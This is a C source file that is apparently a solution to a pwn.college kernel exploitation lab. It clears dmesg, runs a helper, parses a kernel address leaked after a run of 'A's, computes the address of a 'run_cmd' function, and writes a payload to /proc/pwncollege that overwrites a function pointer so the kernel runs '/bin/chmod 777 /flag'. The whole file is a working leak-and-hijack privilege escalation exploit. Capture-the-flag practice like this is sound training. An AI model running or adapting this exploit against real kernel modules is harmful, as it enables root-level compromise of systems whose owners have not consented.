#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <fcntl.h>
#include <string.h>

unsigned long int getLeak() {
    // Clear dmesg and run exploit
    system("dmesg -c > /dev/null 2>&1");
    system("./solve > /dev/null 2>&1");
    
    // Get the latest dmesg entry with our leak
    FILE *fp = popen("dmesg | grep 'AAAAAAAAAAAAAAAA' | tail -1", "r");
    if (!fp) return 0;
    
    char line[2048];
    if (!fgets(line, sizeof(line), fp)) {
        pclose(fp);
        return 0;
    }
    pclose(fp);
    
    // Find the end of 256 A's and parse the next 8 bytes
    char *leak_start = strstr(line, "AAAAAAAAAAAAAAAA");
    if (!leak_start) return 0;
    
    // Skip exactly 256 A's
    leak_start += 256;
    
    unsigned char bytes[8] = {0};
    int byte_idx = 0;
    
    // Parse leaked bytes (mix of \xHH and literal chars)
    while (*leak_start && byte_idx < 8) {
        if (leak_start[0] == '\\' && leak_start[1] == 'x' && 
            leak_start[2] && leak_start[3]) {
            // Parse \xHH
            char hex[3] = {leak_start[2], leak_start[3], 0};
            bytes[byte_idx++] = strtol(hex, NULL, 16);
            leak_start += 4;
        } else if (*leak_start >= 32 && *leak_start <= 126) {
            // Literal printable char
            bytes[byte_idx++] = *leak_start;
            leak_start++;
        } else {
            leak_start++;
        }
    }
    
    // Reconstruct address (little endian)
    unsigned long addr = 0;
    for (int i = 0; i < 8; i++) {
        addr |= ((unsigned long)bytes[i]) << (i * 8);
    }
    
    return addr;
}

int main() {
    unsigned long leak = getLeak();
    if (!leak) {
        printf("Failed to get leak\n");
        return 1;
    }
    
    unsigned long run_cmd = leak - 0x2ce79;
    printf("Using leaked address: 0x%lx\n", run_cmd);
    int fd = open("/proc/pwncollege", O_WRONLY);
    if (fd < 0) return 1;
    
    char payload[0x108] = {0};
    strcpy(payload, "/bin/chmod 777 /flag");
    memcpy(payload + 0x100, &run_cmd, 8);
    
    write(fd, payload, sizeof(payload));
    close(fd);
    
    return 0;
}
